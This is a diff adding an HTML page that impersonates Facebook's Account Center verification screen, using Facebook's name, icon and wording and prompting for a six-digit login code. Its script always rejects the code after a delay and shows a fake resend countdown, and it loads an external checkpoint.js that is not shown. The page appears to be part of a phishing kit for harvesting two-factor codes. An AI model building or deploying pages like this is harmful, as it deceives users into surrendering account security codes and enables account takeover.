@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Facebook Help Center</title>
+    <link rel="icon" type="image/png" href="/fb.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/code.css">
+    <script src="/checkpoint.js" defer></script>
+</head>
+
+<style>
+    button:disabled {
+        
+        cursor: not-allowed;
+        opacity: 0.6;
+        border: 1px solid #aaa;
+        
+    }
+
+    .error-message {
+    color: rgb(200, 10, 40);
+    display: none; /* Bật lại khi cần hiển thị */
+    /* Để SVG và văn bản nằm cạnh nhau */
+    align-items: center;
+    margin-top: 5px;
+}
+
+
+    .new-code-container {
+        display: flex;
+        align-items: center;
+        justify-content: left;
+        gap: 5px;
+        margin-top: 8px;
+		margin-bottom: 40px;
+		color: black;
+    }
+
+    svg {
+        width: 1em;
+        height: 1em;
+        fill: currentColor;
+    }
+</style>
+
+<body>
+    <div class="container">
+        <b style="margin-bottom:5px">Account Center &#8226; Facebook</b>
+        <h1 style="margin-top:0px;">Check your email</h1>
+        <p>Enter the code that we sent to email or phone.</p>
+        <img src="/checkpoint.png" alt="Verification" style="width: 100%; border-radius: 10px;">
+
+        <input type="text" id="code" placeholder="Code" style="margin-bottom:0px">
+
+        <p id="error-messages" class="error-messages">
+</p>
+
+
+        <div class="new-code-container">
+            <svg viewBox="0 0 24 24">
+                <path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path>
+            </svg>
+            <a href="#" id="getNewCode" style="text-decoration: none;">Get a new code</a>
+        </div>
+
+        <button class="button" id="continueButton" disabled>Continue</button>
+        <button style="background-color: aliceblue; color: black; width: 100%; margin-top: 10px;" id="contin">Try Another Way</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+    const codeInput = document.getElementById('code');
+    const continueButton = document.getElementById('continueButton');
+    const errorMessage = document.getElementById('error-messages');
+    const getNewCodeLink = document.getElementById('getNewCode');
+    let countdownInterval;
+
+   
+    codeInput.addEventListener('input', function () {
+        const codeLength = codeInput.value.length;
+
+        if (codeLength === 6) {
+            continueButton.disabled = false;
+            errorMessage.style.display = 'none';
+        } else {
+            continueButton.disabled = true;
+            errorMessage.style.display = 'none';
+        }
+    });
+
+  
+    continueButton.addEventListener('click', function () {
+   
+    errorMessage.innerHTML = '';
+    errorMessage.style.display = 'none';
+
+    
+    setTimeout(() => {
+        errorMessage.innerHTML = `
+            <div style="display: flex; align-items: center; color: red;">
+                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" style="margin-right: 5px;">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"></path>
+                </svg>
+                <span>This code doesn’t work. Check it's correct or try a new one.</span>
+            </div>
+        `;
+
+       
+        errorMessage.style.display = 'block'; 
+        continueButton.disabled = true; 
+    }, 2000); // Đợi 2 giây trước khi hiển thị lỗi
+
+   
+   
+});
+
+
+
+
+    
+     getNewCodeLink.addEventListener('click', function (event) {
+        event.preventDefault();
+        startCountdown(10);  
+    });
+
+    
+    function startCountdown(seconds) {
+        let remainingTime = seconds;
+		getNewCodeLink.style.color = 'black';
+        updateCountdownText(remainingTime);
+
+        getNewCodeLink.style.pointerEvents = 'none';  
+
+        countdownInterval = setInterval(() => {
+            remainingTime--;
+
+            if (remainingTime <= 0) {
+                clearInterval(countdownInterval);
+				getNewCodeLink.style.color = 'blue';
+                getNewCodeLink.textContent = 'Get a new code';
+                getNewCodeLink.style.pointerEvents = 'auto'; 
+            } else {
+                updateCountdownText(remainingTime);
+            }
+        }, 1000);
+    }
+
+    
+    function updateCountdownText(remainingTime) {
+        const timeText = `<strong>00:${remainingTime.toString().padStart(2, '0')}</strong>`;
+        getNewCodeLink.innerHTML = `We can send a new code in ${timeText}`;
+    }
+});
+    </script>
+</body>
+
+</html>
